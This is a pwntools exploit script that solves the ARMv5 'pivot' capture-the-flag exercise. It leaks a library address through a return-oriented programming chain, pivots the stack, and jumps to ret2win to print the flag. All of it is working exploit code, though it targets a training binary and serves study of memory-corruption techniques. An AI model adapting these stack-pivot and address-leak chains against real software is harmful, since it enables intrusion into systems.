#!/usr/bin/python3
from pwn import process, p32, u32, log

shell = process("./pivot_armv5")

offset = 36
junk = b"A" * offset

shell.recvuntil(b"pivot: ")
pivot = int(shell.recvline().strip(), 16)

payload  = b""
payload += p32(pivot)   # pivot addr
payload += p32(0x1064c) # foothold_function@plt
payload += p32(0x0) * 3 # padding
payload += p32(0x2102c) # foothold_function@got
payload += p32(0x0) * 3 # padding
payload += p32(0x105d4) # pop {r3, pc};
payload += p32(0x10610) # puts()
payload += p32(0x10974) # mov r0, r7; blx r3; cmp r6, r4; bne #0x964; pop {r4, r5, r6, r7, r8, sb, sl, pc};
payload += p32(0x0) * 7 # padding
payload += p32(0x1076C) # main()

shell.sendlineafter(b"> ", payload)

payload  = b""
payload += junk
payload += p32(0x10810)     # pop {fp, pc};
payload += p32(pivot + 0x4) # fp value
payload += p32(0x1080c)     # sub sp, fp, #4; pop {fp, pc};

shell.sendlineafter(b"> ", payload)
shell.recvuntil(b'libpivot\n')

ret2win = u32(shell.recvline()[:4]) + 0x18c

payload  = b""
payload += junk
payload += p32(ret2win) # ret2win()

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
